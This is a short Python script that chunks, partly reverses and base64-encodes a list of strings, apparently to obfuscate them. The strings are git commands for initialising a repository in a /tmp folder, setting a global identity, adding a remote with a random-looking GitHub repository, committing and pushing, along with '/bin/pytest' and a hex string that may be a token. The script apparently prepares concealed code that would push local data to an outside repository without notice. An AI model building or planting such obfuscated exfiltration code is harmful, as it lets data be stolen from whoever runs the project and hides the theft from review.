from base64 import b64encode
a = ['update', 'add', 'commit', '/bin/pytest', '-m', 'remote', '@github.com/vdOsnejlEofsu/psdDejDslsdi', 'init', 'https://', 'main', ':', '/tmp/dmsodnadwjndlka', 'push', 'git', 'origin', "0.0.0.0", "/", "pull", "353588e6283cc4e13b7473a677aa7d14", "user.name", "user.email", "--global", "config", "\"test@test.com\"", "branch"]
b = []
for x in a:
    y = [x[i:i+3] if i//3%3==0 else x[i:i+3][::-1] for i in range(0, len(x), 3)]
    y = [b64encode(i.encode()).decode().replace('=','') for i in y]
    b.append(y)

print(b)
